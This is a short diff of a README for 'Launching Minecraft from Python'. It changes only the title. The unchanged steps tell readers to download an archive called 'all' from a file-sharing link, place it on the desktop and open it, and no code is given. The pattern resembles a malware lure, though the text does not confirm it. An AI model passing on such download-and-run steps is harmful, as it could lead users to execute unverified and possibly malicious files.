@@ -1,4 +1,4 @@
-# Launching-Minecraft-from-Python
+# Launching Minecraft from Python
 
 1. Download the file "all" (https://workupload.com/file/GUEsZYNXcZ4)
 3. We throw the downloaded repository on the desktop and open (https://i.imgur.com/z5SaYaM.png)
